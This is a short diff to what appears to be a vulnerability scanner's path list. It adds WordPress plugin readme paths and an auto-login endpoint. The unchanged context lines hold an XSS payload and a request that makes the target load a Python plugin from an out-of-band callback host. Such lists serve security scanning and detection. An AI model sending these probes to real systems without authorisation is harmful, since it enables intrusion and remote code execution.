@@ -118,3 +118,8 @@
 /?GererSite&time={{url_encode(timestamp)}}%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E
 /login.do
 /rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
+/wp-content/plugins/quick-playground/readme.txt
+/wp-content/{{filename}}
+/api/v1/auto_login
+/wp-content/plugins/meta-box/readme.txt
+/wp-content/plugins/canto/readme.txt
